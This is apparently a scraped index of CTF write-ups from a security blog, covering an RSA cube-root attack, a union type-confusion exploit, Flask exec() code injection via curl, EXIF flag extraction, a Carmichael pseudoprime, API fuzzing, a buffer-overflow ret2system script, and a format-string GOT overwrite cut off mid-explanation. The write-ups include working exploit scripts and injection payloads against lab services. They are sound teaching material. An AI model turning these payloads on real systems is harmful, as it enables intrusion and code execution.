226930369324008404506430665129822599607363575603852919162120583266060503841096845215449850837542305149561600338927114119661251460696499327139957176529329816529721270191210916244477856685216908277164786965592514696226839914244875659319076517558315356771625419496558856490589162500644071477833930756663564789474118682399930460441453389184243891216077282099093040608309336018996001999607804378777688916461360425788926205328424150096034051909616660195338367962715944075422262015953517413557051762509103453392458978208273498438562590307215849951642965795004794034627510875473381435541017212698396608282069420063879979294704473018597265098131904018063045638336304539514249356120536639126440406176682131920666202709416873040296025545675588170167188101050321143515763604977360112398853875935854811777919563324598193504991150103686515910286033304218405898596673422366231606745906059933502082246405148016608529329647781881278472976090154368272290761619490459310416194216982004034487788734832367018517887748097898401525507381806366491661667977442619626223736995461937920878273486909559233659993985592623485669719325763874250803422121180632196849036588606681806804779542977650673644965059641304478487892054477356779339273971259597178303031111140283501709064199430436811542668710546345343441829103999774652299936885473523503009793950905394505839067527152330406049376043739899459809162044962915696399547788486686478589032533842260339084289115269117632962020418999678475193626806742925843561762423017088328632995430074096317560695952243685718370993439935920576217955150699936307124819436288798249076737597129112939696691564055039464675485835224015600323880336127740300585706502138276566411354270875449815373574454780958012435380709513462476775660322560648809380299392885568074034592363611854633574329130489038883130308557866650522882369513797748667234932757559604717587488355500387902038121779580165322861111064918787012060293221646897837406810365496082480818926712329359069411884747738664835433270202960934930293501624299923646957173316725913900452048522962309107483401916982942273644258253234270266404355705906353284060421906451579547553536945596143114182089674169040390233403896259650990843716723248382763373947627940237097774346467516704409787940216547116621556170101766022005778473958237584851951344954861454573678221816288918395713861770977183669035942556070546761545743731295074496369509049235313470403093920087296483871093325318582310743131764728865964884228088025170409263061963059341395163695331110078909587683201275928829278515137618074138615962652765840849275249482071226860249873486273492767754112528529082909363770315076153401338000909130399064593162194239842969972233531547178659983688101566357539063657007915493318885261560981584227020995472033268237671253586876466785624983819848898009727296036477735934655396784185145970437264598583023149435320752783415451501056661506420824553646380553999069539369921607338465904854175989857439546309918605715931884872868486467592929171204176835962074595013700782437300593834359405047404582902352876008272897313 \u0026gt;\u0026gt;\u0026gt; import gmpy2 \u0026gt;\u0026gt;\u0026gt; gmpy2.iroot(c, 31) (mpz(200356292991524037137861561536744232032744458778044360811305506965391630908660572435153888208107258), False)  But we see it output False, which means that the root is not exact. Hence, we can think that the modulus has some effect, but it must be short. Therefore, $m = \\sqrt[e]{c + k \\cdot n}$, where $k$ is some integer.\nWe can use a for loop until we get that the root is exact, and then print the value formatted as bytes:\n\u0026gt;\u0026gt;\u0026gt; for k in range(n): ... m, ok = gmpy2.iroot(c + k * n, 31) ... if ok: ... print(k, bytes.fromhex(hex(m)[2:]).decode()) ... break ... 28 ictf{d0nt_f0rget_t0_pad_y0ur_pl@intexts!}  And there we have the flag, notice that $k = 28$, so indeed, $m = \\sqrt[31]{c + 28 \\cdot n}$, which is the vulnerability of using large modulus and short exponents for RSA.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/enourmous/","section":"ctf","summary":"ImaginaryCTF 05/08/2022. 50 points. RSA. Large modulus and short exponent","time":2,"title":"Enormous"},{"contents":"We are given a 64-bit binary called chall:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  If we connect to the remote instance, we see this:\n$ nc 134.122.106.203 30576 Something strange is coming out of the TV.. (T)ry to turn it off (R)un (C)ry \u0026gt;\u0026gt;  Nothing really explanatory\u0026hellip;\nStatic code analysis This time, we are given the original C source code (chall.c):\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string.h\u0026gt; staticunion{ unsignedlonglonginteger; charstring[8]; } DataStore; typedefenum{ STORE_GET, STORE_SET, FLAG } action_t; typedefenum{ INTEGER, STRING } field_t; typedefstruct{  action_tact; field_tfield; } menu_t; menu_tmenu() { menu_tres={ 0}; charbuf[32] ={ 0}; printf(\"\\n(T)ry to turn it off\\n(R)un\\n(C)ry\\n\\n\u0026gt;\u0026gt; \"); fgets(buf, sizeof(buf), stdin); buf[strcspn(buf, \"\\n\")] =0; switch(buf[0]) { case'T': res.act=STORE_SET; break; case'R': res.act=STORE_GET; break; case'C': res.act=FLAG; returnres; default: puts(\"\\nWhat's this nonsense?!\"); exit(-1); } printf(\"\\nThis does not seem to work.. (L)ie down or (S)cream\\n\\n\u0026gt;\u0026gt; \"); fgets(buf, sizeof(buf), stdin); buf[strcspn(buf, \"\\n\")] =0; switch(buf[0]) { case'L': res.field=INTEGER; break; case'S': res.field=STRING; break; default: printf(\"\\nYou are doomed!\\n\"); exit(-1); } returnres; } voidset_field(field_tf) { charbuf[32] ={0}; printf(\"\\nMaybe try a ritual?\\n\\n\u0026gt;\u0026gt; \"); fgets(buf, sizeof(buf), stdin); switch(f) { caseINTEGER: sscanf(buf, \"%llu\", \u0026amp;DataStore.integer); if(DataStore.integer==13371337) { puts(\"\\nWhat's this nonsense?!\"); exit(-1); } break; caseSTRING: memcpy(DataStore.string, buf, sizeof(DataStore.string)); break; } } voidget_field(field_tf) { printf(\"\\nAnything else to try?\\n\\n\u0026gt;\u0026gt; \"); switch(f) { caseINTEGER: printf(\"%llu\\n\", DataStore.integer); break; caseSTRING: printf(\"%.8s\\n\", DataStore.string); break; } } voidget_flag() { if(DataStore.integer==13371337) { system(\"cat flag.txt\"); exit(0); } else{ puts(\"\\nSorry, this will not work!\"); } } intmain() { setvbuf(stdout, NULL, _IONBF, 0); bzero(\u0026amp;DataStore, sizeof(DataStore)); printf(\"\\nSomething strange is coming out of the TV..\\n\"); while(1) { menu_tresult=menu(); switch(result.act) { caseSTORE_SET: set_field(result.field); break; caseSTORE_GET: get_field(result.field); break; caseFLAG: get_flag(); break; } } }  Basically, there\u0026rsquo;s a menu where we can select whether to set a field, get the field or get the flag.\nIn order to get the flag, we need that result.field equals 13371337:\nvoidget_flag() { if(DataStore.integer==13371337) { system(\"cat flag.txt\"); exit(0); } else{ puts(\"\\nSorry, this will not work!\"); } }  However, we are not able to set this special value using set_field:\nvoidset_field(field_tf) { charbuf[32] ={0}; printf(\"\\nMaybe try a ritual?\\n\\n\u0026gt;\u0026gt; \"); fgets(buf, sizeof(buf), stdin); switch(f) { caseINTEGER: sscanf(buf, \"%llu\", \u0026amp;DataStore.integer); if(DataStore.integer==13371337) { puts(\"\\nWhat's this nonsense?!\"); exit(-1); } break; caseSTRING: memcpy(DataStore.string, buf, sizeof(DataStore.string)); break; } }  Finding the flaw The problem here is this data structure:\nstaticunion{ unsignedlonglonginteger; charstring[8]; } DataStore;  The above code indicates to the program that DataStore can be read both as an unsigned long long and as a char[8]. In other words, DataStore.integer and DataStore.string share the same memory address, their binary value is the same.\nTherefore, we can enter 13371337 as a string (in bytes format, little-endian), which is not checked in set_field.\nExploit development In order to do this, we can make use of a short pwntools script:\ndefmain(): p=get_process() p.sendlineafter(b'\u0026gt;\u0026gt; ', b'T') p.sendlineafter(b'\u0026gt;\u0026gt; ', b'S') p.sendlineafter(b'\u0026gt;\u0026gt; ', p64(13371337)) p.sendlineafter(b'\u0026gt;\u0026gt; ', b'C') print(p.recvline().decode()) p.close()  Flag And there\u0026rsquo;s the flag:\n$ python3 solve.py 134.122.106.203:30576 [*] './entity' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 134.122.106.203 on port 30576: Done HTB{f1ght_34ch_3nt1ty_45_4_un10n} [*] Closed connection to 134.122.106.203 port 30576  The full exploit code is here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/entity/","section":"ctf","summary":"64-bit binary. Union structure. Type confusion","time":3,"title":"Entity"},{"contents":"We are given this website:\nHowever, the web UI is not that interesting\u0026hellip;\nStatic code analysis We also have the source code. The web application is built with Flask in Python. The following file is application/blueprints/routes.py:\nfromflaskimportBlueprint, render_template, request fromapplication.utilimportresponse web=Blueprint('web', __name__) api=Blueprint('api', __name__) @web.route('/') defindex(): returnrender_template('index.html') @api.route('/get_health', methods=['POST']) defcount(): ifnotrequest.is_json: returnresponse('Invalid JSON!'), 400 data=request.get_json() current_health=data.get('current_health') attack_power=data.get('attack_power') operator=data.get('operator')  ifnotcurrent_healthornotattack_powerornotoperator: returnresponse('All fields are required!'), 400 result={} try: code=compile(f'result = {int(current_health)}{operator}{int(attack_power)}', '\u0026lt;string\u0026gt;', 'exec') exec(code, result) returnresponse(result.get('result')) except: returnresponse('Something Went Wrong!'), 500  The vulnerability is that we, as attackers, are able to execute arbitrary Python code using the exec function at endpoint /api/get_health. We only need to find a payload that makes the code string have valid Python syntax. For instance:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; current_health = 1337 \u0026gt;\u0026gt;\u0026gt; operator = \"; result = 'Run Python code here'; \" \u0026gt;\u0026gt;\u0026gt; attack_power = 0xACDC \u0026gt;\u0026gt;\u0026gt; result = {} \u0026gt;\u0026gt;\u0026gt; code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '\u0026lt;string\u0026gt;', 'exec') \u0026gt;\u0026gt;\u0026gt; exec(code, result) \u0026gt;\u0026gt;\u0026gt; result.get('result') 'Run Python code here'  In order to interact with the server we must use JSON format:\n$ curl 178.62.85.130:32757/api/get_health -d '{\"operator\":\"; result = \\\"Run Python code here\\\"; \",\"current_health\":1,\"attack_power\":1}' -H 'Content-Type: application/json' {\"message\":\"Run Python code here\"}  Flag Instead of printing a test string, we can execute Python code to read /flag.txt:\n$ curl 178.62.85.130:32757/api/get_health -d '{\"operator\":\"; result = open(\\\"/flag.txt\\\").read(); \",\"current_health\":1,\"attack_power\":1}' -H 'Content-Type: application/json' {\"message\":\"HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}\"}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/evaluation-deck/","section":"ctf","summary":"Python. Code injection","time":2,"title":"Evaluation Deck"},{"contents":"We are told to find the flag in this image:\nHowever, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file metadata.\nWe can extract metadata using exiftool:\n$ exiftool Computer-Password-Security-Hacker\\ -\\ Copy.jpg ExifTool Version Number : 12.30 File Name : Computer-Password-Security-Hacker - Copy.jpg Directory : . File Size : 54 KiB File Modification Date/Time : - File Access Date/Time : - File Inode Change Date/Time : - File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.02 X Resolution : 100 Y Resolution : 100 Exif Byte Order : Big-endian (Motorola, MM) Resolution Unit : None Y Cb Cr Positioning : Centered Exif Version : 0231 Components Configuration : Y, Cb, Cr, - Flashpix Version : 0100 Owner Name : CTFlearn{3l1t3_3x1f_4uth0r1ty_dud3br0} GPS Latitude Ref : South GPS Longitude Ref : East Quality : 60% DCT Encode Version : 100 APP14 Flags 0 : [14], Encoded with Blend=1 downsampling APP14 Flags 1 : (none) Color Transform : YCbCr Image Width : 660 Image Height : 371 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 660x371 Megapixels : 0.245 GPS Latitude : 77 deg 17' 2.62\" S GPS Longitude : 44 deg 4' 7.30\" E GPS Position : 77 deg 17' 2.62\" S, 44 deg 4' 7.30\" E  And there is the flag: CTFlearn{3l1t3_3x1f_4uth0r1ty_dud3br0}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/forensics/exif/","section":"ctf","summary":"File metadata","time":2,"title":"Exif"},{"contents":"We got the Python source code of the server:\nfromsecretimportFLAG fromCrypto.Util.numberimportisPrime importsocketserver importsignal classHandler(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(0) main(self.request) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defsendMessage(s, msg): s.send(msg.encode()) defreceiveMessage(s, msg): sendMessage(s, msg) returns.recv(4096).decode().strip() defgenerate_basis(n): basis=[True] *n foriinrange(3, int(n**0.5) +1, 2): ifbasis[i]: basis[i*i::2*i] =[False] *((n-i*i-1) //(2*i) +1) return[2] +[iforiinrange(3, n, 2) ifbasis[i]] defmillerRabin(n, b): basis=generate_basis(300) ifn==2orn==3: returnTrue ifn%2==0: returnFalse r, s=0, n-1 whiles%2==0: r+=1 s//=2 forbinbasis: x=pow(b, s, n) ifx==1orx==n-1: continue for_inrange(r-1): x=pow(x, 2, n) ifx==n-1: break else: returnFalse returnTrue def_isPrime(p): ifp\u0026lt;1: returnFalse if(p.bit_length() \u0026lt;=600) and(p.bit_length() \u0026gt;1500): returnFalse ifnotmillerRabin(p, 300): returnFalse returnTrue defmain(s): p=receiveMessage(s, \"Give p: \") try: p=int(p) except: sendMessage(s, \"Error!\") if_isPrime(p) andnotisPrime(p): sendMessage(s, FLAG) else: sendMessage(s, \"Conditions not satisfied!\") if__name__=='__main__': socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), Handler) server.serve_forever()  Interacting with the server The server asks to enter a number:\n$ nc 178.62.85.130 30337 Give p: 1337 Conditions not satisfied! Ncat: Broken pipe.  Basically, the server will give us the flag when we pass this check\nif_isPrime(p) andnotisPrime(p): sendMessage(s, FLAG) else: sendMessage(s, \"Conditions not satisfied!\")  In other words, p must be classified as a prime number by the Miller-Rabin primality test, although it is actually not a prime. Therefore, we must find a number that makes Miller-Rabin test fail.\nAfter searching a bit on the Internet, we find this GitHub Gist, which uses a SageMath script to find such value.\nFlag We can just enter that special number and capture the flag:\n$ nc 178.62.85.130 30337 Give p: 99597527340020670697596886062721977401836948352586238797499761849061796816245727295797460642211895009946326533856101876592304488359235447755504083536903673408562244316363452203072868521183142694959128745107323188995740668134018742165409361423628304730379121574707411453909999845745038957688998441109092021094925758212635651445626620045726265831347783805945477368631216031783484978212374792517000073275125176790602508815912876763504846656547041590967709195413101791490627310943998497788944526663960420235802025853374061708569334400472016398343229556656720912631463470998180176325607452843441554359644313713952036867 HTB{c42m1ch431_15_f457_8u7_50m371m35_f457_15_n07_7h3_8357} Ncat: Broken pipe.  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/fast-carmichael/","section":"ctf","summary":"Miller-Rabin primality test","time":2,"title":"Fast Carmichael"},{"contents":"We got the Python source code of the server:\nfromsecretimportFLAG fromCrypto.Util.numberimportisPrime importsocketserver importsignal classHandler(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(0) main(self.request) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defsendMessage(s, msg): s.send(msg.encode()) defreceiveMessage(s, msg): sendMessage(s, msg) returns.recv(4096).decode().strip() defgenerate_basis(n): basis=[True] *n foriinrange(3, int(n**0.5) +1, 2): ifbasis[i]: basis[i*i::2*i] =[False] *((n-i*i-1) //(2*i) +1) return[2] +[iforiinrange(3, n, 2) ifbasis[i]] defmillerRabin(n, b): basis=generate_basis(300) ifn==2orn==3: returnTrue ifn%2==0: returnFalse r, s=0, n-1 whiles%2==0: r+=1 s//=2 forbinbasis: x=pow(b, s, n) ifx==1orx==n-1: continue for_inrange(r-1): x=pow(x, 2, n) ifx==n-1: break else: returnFalse returnTrue def_isPrime(p): ifp\u0026lt;1: returnFalse if(p.bit_length() \u0026lt;=600) and(p.bit_length() \u0026gt;1500): returnFalse ifnotmillerRabin(p, 300): returnFalse returnTrue defmain(s): p=receiveMessage(s, \"Give p: \") try: p=int(p) except: sendMessage(s, \"Error!\") if_isPrime(p) andnotisPrime(p): sendMessage(s, FLAG) else: sendMessage(s, \"Conditions not satisfied!\") if__name__=='__main__': socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), Handler) server.serve_forever()  Interacting with the server The server asks to enter a number:\n$ nc 178.62.85.130 30337 Give p: 1337 Conditions not satisfied! Ncat: Broken pipe.  Basically, the server will give us the flag when we pass this check\nif_isPrime(p) andnotisPrime(p): sendMessage(s, FLAG) else: sendMessage(s, \"Conditions not satisfied!\")  In other words, p must be classified as a prime number by the Miller-Rabin primality test, although it is actually not a prime. Therefore, we must find a number that makes Miller-Rabin test fail.\nAfter searching a bit on the Internet, we find this GitHub Gist, which uses a SageMath script to find such value.\nFlag We can just enter that special number and capture the flag:\n$ nc 178.62.85.130 30337 Give p: 99597527340020670697596886062721977401836948352586238797499761849061796816245727295797460642211895009946326533856101876592304488359235447755504083536903673408562244316363452203072868521183142694959128745107323188995740668134018742165409361423628304730379121574707411453909999845745038957688998441109092021094925758212635651445626620045726265831347783805945477368631216031783484978212374792517000073275125176790602508815912876763504846656547041590967709195413101791490627310943998497788944526663960420235802025853374061708569334400472016398343229556656720912631463470998180176325607452843441554359644313713952036867 HTB{c42m1ch431_num8325_423_fun_p53ud0p21m35} Ncat: Broken pipe.  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/fast-carmichael/","section":"ctf","summary":"Miller-Rabin primality test","time":2,"title":"Fast Carmichael"},{"contents":"We are given a host puzzler7.imaginaryctf.org:5005. If we send a GET request using curl, we have this response:\n$ curl puzzler7.imaginaryctf.org:5005 {\"api_message\":\"Yet another sourceless web...\"} $ curl -i puzzler7.imaginaryctf.org:5005 HTTP/1.1 200 OK date: server: uvicorn content-length: 47 content-type: application/json {\"api_message\":\"Yet another sourceless web...\"}  Using ffuf, we discover endpoints docs and redoc:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://puzzler7.imaginaryctf.org:5005/FUZZ docs [Status: 200, Size: 931, Words: 150, Lines: 31, Duration: 114ms] redoc [Status: 200, Size: 891, Words: 176, Lines: 31, Duration: 111ms] [Status: 200, Size: 47, Words: 4, Lines: 1, Duration: 111ms]  Both of them are supposed to document API endpoints for people who want to consume the API:\nThere we can find the endpoint to get the flag:\n$ curl puzzler7.imaginaryctf.org:5005/wow_this_is_such_a_long_and_odd_name_for_a_flag_endpoint_hmmmmm {\"flag\":\"ictf{google_the_protocol_is_different_than_guessy...right?}\"}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/fasting/","section":"ctf","summary":"ImaginaryCTF 28/09/2022. 50 points. API docs","time":1,"title":"Fasting"},{"contents":"We are given a server to connect using SSH. There is a 32-bit binary called color that is SGID:\ncolor@ubuntu-512mb-nyc3-01:~$ ls -l total 20 -r--r--r-- 1 root root 714 Sep 12 2017 Makefile -r-xr-sr-x 1 root color_pwn 7672 Sep 12 2017 color -r--r--r-- 1 root root 722 Sep 12 2017 color.c -r--r----- 1 root color_pwn 24 Sep 12 2017 flag.txt color@ubuntu-512mb-nyc3-01:~$ file color color: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e9a1c78d69ac7f50ffbf21b1075902cea8407db3, not stripped color@ubuntu-512mb-nyc3-01:~$ checksec color [*] '/home/color/color' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)  We also have the C source code. Basically, what the program does is call function gets, which is vulnerable to Buffer Overflow. Then the variable buf is used inside a for loop, resulting in good = 0, because it is using XOR operations and AND operations to get a zero in good, so that vuln functions returns 0 and system(\u0026quot;/bin/sh\u0026quot;) is not executed:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int vuln() { char buf[32]; printf(\"Enter your favorite color: \"); gets(buf); int good = 0; for (int i = 0; buf[i]; i++) { good \u0026amp;= buf[i] ^ buf[i]; } return good; } int main(char argc, char** argv) { setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); // disable buffering. setbuf(stdout, NULL); if (vuln()) { puts(\"Me too! That's my favorite color too!\"); puts(\"You get a shell! Flag is in flag.txt\"); system(\"/bin/sh\"); } else { puts(\"Boo... I hate that color! :(\"); } }  However, we can exploit the Buffer Overflow to redirect the program to system(\u0026quot;/bin/sh\u0026quot;).\nAlthough the server has GDB and the PEDA extension installed, I prefer to debug it locally. To transfer the binary, one could encode the file in Base64, copy the output and then decode it locally.\nFirst, we run it and identify the Buffer Overflow vulnerability:\n$ ./color  Enter your favorite color: AAAA Boo... I hate that color! :( $ ./color Enter your favorite color: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA zsh: segmentation fault (core dumped) ./color  Alright. Now we can use GDB to get the offset to overwrite the $eip register (which contains the next instruction to execute):\n$ gdb -q color Reading symbols from color... (No debugging symbols found in color) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./color Enter your favorite color: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Program received signal SIGSEGV, Segmentation fault. 0x6161616e in ?? ()  gef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 52 (little-endian search) likely [+] Found at offset 49 (big-endian search)  So we need 52 bytes before $eip. Let\u0026rsquo;s test it:\ngef➤ pattern create 52 [+] Generating a pattern of 52 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa [+] Saved as '$_gef1' gef➤ run Starting program: ./color Enter your favorite color: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaaBBBB Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? ()  Alright, we have control over $eip. Now let\u0026rsquo;s find the address where we want to jump, which is system:\n$ gdb -q color Reading symbols from color... (No debugging symbols found in color) gef➤ p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x8048450 \u0026lt;system@plt\u0026gt;  However, we need to call system(\u0026quot;/bin/sh\u0026quot;), so we must get the pointer to the string \u0026quot;/bin/sh\u0026quot;. This can be done using strings:\n$ strings -atx color | grep /bin/sh 799 /bin/sh  But this is not the real address of the string, it is just an offset. To compute the real address, we must add the base address of the binary, which is 0x8048000, since it is a 32-bit binary with no PIE protection (shown in the checksec output at the top). Hence, the address of the string during program execution will be 0x8048799.\nFinally, another interesting field of our input is the return address. This is not so relevant for this challenge, so I decided to fill it with zero bytes, but one could use the main for example, in order not to cause a denyal of service (DoS).\nUsing a Python script with pwntools, we can exploit the binary with this short code:\n#!/usr/bin/env python3 from pwn import context, ELF, p32 elf = ELF('color') context.binary = elf p = elf.process() offset = 52 junk = b'A' * offset payload = junk payload += p32(0x8048450) payload += p32(0) payload += p32(0x8048799) p.sendlineafter(b'Enter your favorite color: ', payload) p.interactive()  If we run the exploit locally, we will get a shell:\n$ python3 solve.py [*] './color' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './color': pid 944522 [*] Switching to interactive mode $ ls color solve.py  Now we need to execute it on the remote instance. However, it is not listening in any port. Fortunately, the machine has socat installed and we are able to open a port and redirect the traffic to color:\ncolor@ubuntu-512mb-nyc3-01:~$ which socat /usr/bin/socat color@ubuntu-512mb-nyc3-01:~$ socat tcp-l:1234,reuseaddr,fork EXEC:./color  Now we can interact the the program on port 1234. Let\u0026rsquo;s add a function to the Python script and use pwntools magic to remove the hardcoded addresses:\n#!/usr/bin/env python3 from pwn import context, ELF, p32, remote elf = ELF('color') context.binary = elf def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) p = get_process() offset = 52 junk = b'A' * offset payload = junk payload += p32(elf.plt.system) payload += p32(0) payload += p32(next(elf.search(b'/bin/sh'))) p.sendlineafter(b'Enter your favorite color: ', payload) p.interactive()  Finally, we can send it to get the flag:\n$ python3 solve.py 104.131.79.111 1234 [*] './color' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to 104.131.79.111 on port 1234: Done [*] Switching to interactive mode $ ls Makefile color color.c flag.txt $ cat flag.txt CTFlearn{c0lor_0f_0verf1ow}  The full exploit script can be found in here: solve.py.\nThere is a simpler way to complete the exploitation. The source code has a explicit call to system(\u0026quot;/bin/sh\u0026quot;), and we have a Buffer Overflow vulnerability, so we can redirect program execution to this specific instruction.\nFirst, we must obtain the assembly code using objdump (or GDB), and then look for the call to system:\n$ objdump --disassemble=main color | grep -C 4 system 804866f: e8 cc fd ff ff call 8048440 \u0026lt;puts@plt\u0026gt; 8048674: 83 c4 10 add $0x10,%esp 8048677: 83 ec 0c sub $0xc,%esp 804867a: 68 99 87 04 08 push $0x8048799 804867f: e8 cc fd ff ff call 8048450 \u0026lt;system@plt\u0026gt; 8048684: 83 c4 10 add $0x10,%esp 8048687: eb 10 jmp 8048699 \u0026lt;main+0xba\u0026gt; 8048689: 83 ec 0c sub $0xc,%esp 804868c: 68 a1 87 04 08 push $0x80487a1  The address we must jump to is 0x8048674, which is a bit before the proper call to system because it needs to prepare the actual call (namely, put \u0026quot;/bin/sh\u0026quot; as an argument on the stack).\nWe see that it works locally, puttin the address in little-endian format and adding cat to keep the user input open:\n$ (python3 -c 'import os; os.write(1, b\"A\" * 52 + b\"\\x77\\x86\\x04\\x08\")'; cat) | ./color Enter your favorite color: ls color solve.py  And it works as well on the server (without using socat):\ncolor@ubuntu-512mb-nyc3-01:~$ (python3 -c 'import os; os.write(1, b\"A\" * 52 + b\"\\x77\\x86\\x04\\x08\")'; cat) | ./color Enter your favorite color: ls Makefile color color.c flag.txt cat flag.txt CTFlearn{c0lor_0f_0verf1ow}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/binary/favorite-color/","section":"ctf","summary":"32-bit binary. Buffer Overflow. Calling a function with arguments","time":6,"title":"Favorite Color"},{"contents":"We are given a 64-bit binary called chall:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Static code analysis We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat\u0026rsquo;s Last Theorem.\nAs a reminder, Fermat\u0026rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:\n$$ a ^ n + b ^ n = z ^ n $$\nFor $n \u0026gt; 2$.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;math.h\u0026gt; #define SIZE 0x100 void main(void) { char A[SIZE]; char B[SIZE]; int a = 0; int b = 0; puts(\"Welcome to Fermat\\\\'s Last Theorem as a service\"); setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); printf(\"A: \"); read(0, A, SIZE); printf(\"B: \"); read(0, B, SIZE); A[strcspn(A, \"\\n\")] = 0; B[strcspn(B, \"\\n\")] = 0; a = atoi(A); b = atoi(B); if (a == 0 || b == 0) { puts(\"Error: could not parse numbers!\"); return 1; } char buffer[SIZE]; snprintf(buffer, SIZE, \"Calculating for A: %s and B: %s\\n\", A, B); printf(buffer); int answer = -1; for (int i = 0; i \u0026lt; 100; i++) { if (pow(a, 3) + pow(b, 3) == pow(i, 3)) { answer = i; } } if (answer != -1) printf(\"Found the answer: %d\\n\", answer); }  Format String vulnerability On the source code we can see a Format String vulnerability:\nsnprintf(buffer, SIZE, \"Calculating for A: %s and B: %s\\n\", A, B); printf(buffer);  Because we can add format strings into buffer which is the first argument of printf. However, we need to enter a valid number in A and B:\nprintf(\"A: \"); read(0, A, SIZE); printf(\"B: \"); read(0, B, SIZE); A[strcspn(A, \"\\n\")] = 0; B[strcspn(B, \"\\n\")] = 0; a = atoi(A); b = atoi(B);  But this is easy. Let\u0026rsquo;s try:\n$ ./chall Welcome to Fermat\\'s Last Theorem as a service A: 1.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x B: 1 Calculating for A: 1.400bd8.97161728.0.ffffffff.97161350.0.0.97161580.1.78252e31.252e7825.2e78252e.78252e78.252e7825 and B: 1  As we can see, we can dump values from the stack. And also, the value of the format string starts at position 10 (offset 10):\n$ ./chall Welcome to Fermat\\'s Last Theorem as a service A: 1AAA%10$x B: 1 Calculating for A: 1AAA41414131 and B: 1  Format String exploitation The program will exit after we enter our input. We need to find a way of running again the program without stopping the process. This can be done using a the Format String vulnerability, because there is a format %n that allows to write the number of bytes written until %n into the address given as a parameter (the value of a position in the stack).\nWe notice that the binary has Partial RELRO, which means that the GOT is not writable during a Buffer Overflow exploitation, but it is writable via Format String. Hence, the idea is to change the value of an function in the GOT to point to main and be able to rerun the program as a result.\n$ gdb -q chall Reading symbols from chall... (No debugging symbols found in chall) gef➤ break main Breakpoint 1 at 0x40083b gef➤ run Starting program: ./chall Breakpoint 1, 0x000000000040083b in main ()  Now we show the GOT entries:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 9 [0x601018] puts@GLIBC_2.2.5 → 0x4006c6 [0x601020] __stack_chk_fail@GLIBC_2.4 → 0x4006d6 [0x601028] setbuf@GLIBC_2.2.5 → 0x4006e6 [0x601030] printf@GLIBC_2.2.5 → 0x4006f6 [0x601038] snprintf@GLIBC_2.2.5 → 0x400706 [0x601040] pow@GLIBC_2.2.5 → 0x400716 [0x601048] strcspn@GLIBC_2.2.5 → 0x400726 [0x601050] read@GLIBC_2.2.5 → 0x400736 [0x601058] atoi@GLIBC_2.2.5 → 0x400746  From the point where we have the printf vulnerability, only pow and printf are called. We are not interested in changing printf, so 